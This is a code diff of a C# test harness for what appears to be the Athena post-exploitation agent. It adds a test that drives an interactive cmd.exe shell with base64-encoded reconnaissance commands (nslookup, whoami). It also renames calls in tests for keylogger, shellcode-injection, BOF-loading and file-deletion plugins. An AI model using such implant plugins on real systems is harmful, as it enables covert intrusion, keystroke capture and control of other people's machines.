@@ -12,6 +12,7 @@ using Plugins;
 using Athena.Commands;
 using Athena.Utilities;
 using System.Threading.Tasks;
+using Athena.Models.Comms.Tasks;
 
 namespace TestPluginLoader
 {
@@ -21,12 +22,68 @@ namespace TestPluginLoader
         public static AssemblyLoadContext loadcontext = new AssemblyLoadContext("commands");
         static async Task Main(string[] args)
         {
-            Console.WriteLine("Starting Keylogger.");
-            await TestLs();
-            var res = await TaskResponseHandler.GetTaskResponsesAsync();
-            Console.WriteLine(res.FirstOrDefault());
-            Console.WriteLine("Finished.");
-            Console.ReadKey();
+            await TestInteractiveShell();
+            //Console.WriteLine("Starting Keylogger.");
+            //await TestLs();
+            //var res = await TaskResponseHandler.GetTaskResponsesAsync();
+            //Console.WriteLine(res.FirstOrDefault());
+            //Console.WriteLine("Finished.");
+            //Console.ReadKey();
+        }
+
+        static async Task TestInteractiveShell()
+        {
+            IPlugin plug = new InteractiveShell();
+            Dictionary<string, string> parameters = new Dictionary<string, string>();
+            parameters.Add("executable", @"C:\Windows\System32\cmd.exe");
+            parameters.Add("task-id", "1");
+            plug.Start(parameters);
+            //Wait for process to finish starting
+            System.Threading.Thread.Sleep(4000);
+
+            //Send whoami.exe to process
+            //Console.WriteLine("server 8.8.8.8");
+            InteractiveMessage im = new InteractiveMessage()
+            {
+                data = "bnNsb29rdXA=",
+                message_type = MessageType.Input,
+                task_id = "1"
+            };
+            System.Threading.Thread.Sleep(1000);
+
+            plug.Interact(im);
+
+            System.Threading.Thread.Sleep(1000);
+            //Console.WriteLine("google.com");
+            im = new InteractiveMessage()
+            {
+                data = "c2VydmVyIDguOC44Ljg=",
+                message_type = MessageType.Input,
+                task_id = "1"
+            };
+
+            plug.Interact(im);
+            System.Threading.Thread.Sleep(1000);
+            im = new InteractiveMessage()
+            {
+                data = "",
+                message_type = MessageType.CtrlC,
+                task_id = "1"
+            };
+
+            plug.Interact(im); 
+            System.Threading.Thread.Sleep(1000);
+
+            im = new InteractiveMessage()
+            {
+                data = "d2hvYW1pCg==",
+                message_type = MessageType.Input,
+                task_id = "1"
+            };
+
+            plug.Interact(im);
+
+            System.Threading.Thread.Sleep(100000);
         }
 
         static async Task TestCoff()
@@ -38,7 +95,7 @@ namespace TestPluginLoader
             parameters.Add("timeout", "30");
 
             parameters.Add("task-id", "1");
-            new Coff().Execute(parameters);
+            new Coff().Start(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
         }
@@ -62,7 +119,7 @@ namespace TestPluginLoader
             parameters.Add("task-id", "1");
             IPlugin plugin = new InjectShellcode();
 
-            plugin.Execute(parameters);
+            plugin.Start(parameters);
 
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
@@ -74,7 +131,7 @@ namespace TestPluginLoader
             parameters.Add("path", @"C$\Users\scott\Downloads\");
             parameters.Add("file", "test.txt");
             parameters.Add("task-id", "1");
-            new Rm().Execute(parameters);
+            new Rm().Start(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
         }
@@ -87,7 +144,7 @@ namespace TestPluginLoader
             parameters.Add("task-id", "1");
             IPlugin plug = new Ls();
 
-            plug.Execute(parameters);
+            plug.Start(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
 
@@ -97,7 +154,7 @@ namespace TestPluginLoader
         {
             Dictionary<string, string> parameters = new Dictionary<string, string>();
             parameters.Add("task-id", "1");
-            new Ps().Execute(parameters);
+            new Ps().Start(parameters);
             var res = await TaskResponseHandler.GetTaskResponsesAsync();
             Console.WriteLine(res.FirstOrDefault());
         }
@@ -106,7 +163,7 @@ namespace TestPluginLoader
         {
             Dictionary<string, string> parameters = new Dictionary<string, string>();
             parameters.Add("task-id", "1");
-            new Keylogger().Execute(parameters);
+            new Keylogger().Start(parameters);
         }
     }
 }
